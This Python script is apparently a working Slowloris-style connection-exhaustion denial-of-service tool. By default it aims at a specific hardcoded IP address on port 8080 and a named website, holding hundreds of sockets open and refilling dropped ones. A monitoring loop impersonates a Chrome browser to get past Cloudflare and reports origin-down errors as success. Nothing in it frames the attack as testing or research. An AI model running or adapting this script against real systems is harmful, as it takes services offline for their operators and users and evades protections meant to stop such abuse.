#!/usr/bin/env python3
"""
Slowloris-style TCP connection exhaustion on port 8080.
Opens raw sockets, holds them open indefinitely, replaces dead ones.
Runs until Ctrl+C.

Usage:
  python3 slowloris_8080.py
  python3 slowloris_8080.py --target 104.236.68.226 --port 8080 --connections 300
"""

import socket, threading, time, argparse, urllib.request
try:
    from curl_cffi import requests as cf_requests
    USE_CFFI = True
except ImportError:
    USE_CFFI = False
from datetime import datetime

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"; C = "\033[0;36m"
B = "\033[1m"; W = "\033[0m"

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target",      default="104.236.68.226")
    p.add_argument("--port",        type=int, default=8080)
    p.add_argument("--connections", type=int, default=300)
    p.add_argument("--check-host",  default="metoo-shatkin.com")
    p.add_argument("--check-interval", type=float, default=5.0)
    args = p.parse_args()

    socks = []
    lock  = threading.Lock()
    stop  = threading.Event()

    print(f"""
{B}{'='*60}{W}
  Port 8080 Connection Exhaustion
{B}{'='*60}{W}
  Target      : {args.target}:{args.port}
  Connections : {args.connections} (auto-refill dead ones)
  Check URL   : https://{args.check_host}/
  Mode        : Continuous until Ctrl+C
{B}{'='*60}{W}
""")

    def open_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((args.target, args.port))
            s.settimeout(None)
            return s
        except:
            return None

    def fill_pool():
        while not stop.is_set():
            with lock:
                dead = [s for s in socks if _is_dead(s)]
                for s in dead:
                    socks.remove(s)
                    try: s.close()
                    except: pass
                needed = args.connections - len(socks)

            for _ in range(needed):
                if stop.is_set():
                    break
                s = open_socket()
                if s:
                    with lock:
                        socks.append(s)
            time.sleep(1)

    def _is_dead(s):
        try:
            s.send(b'', socket.MSG_DONTWAIT)
            return False
        except BlockingIOError:
            return False
        except:
            return True

    def check_loop():
        while not stop.is_set():
            with lock:
                held = len(socks)
            ts = datetime.now().strftime("%H:%M:%S")
            try:
                if USE_CFFI:
                    r = cf_requests.get(f"https://{args.check_host}/",
                                        timeout=5, impersonate="chrome124")
                    code = r.status_code
                else:
                    req = urllib.request.Request(
                        f"https://{args.check_host}/",
                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"}
                    )
                    r    = urllib.request.urlopen(req, timeout=5)
                    code = r.status
                if code in (522, 524, 525):
                    print(f"  {ts} | held={held:>3} | {R}CF {code} — ORIGIN DOWN{W}")
                elif code == 200:
                    print(f"  {ts} | held={held:>3} | {G}HTTP {code} — UP{W}")
                else:
                    print(f"  {ts} | held={held:>3} | {Y}HTTP {code}{W}")
            except Exception as e:
                err = str(e)[:55]
                col = R if any(x in err.lower() for x in ("timed out","timeout","refused","522","524")) else Y
                print(f"  {ts} | held={held:>3} | {col}FAIL — {err}{W}")
            time.sleep(args.check_interval)

    threading.Thread(target=fill_pool,  daemon=True).start()
    threading.Thread(target=check_loop, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n")
        stop.set()
        with lock:
            for s in socks:
                try: s.close()
                except: pass

if __name__ == "__main__":
    main()
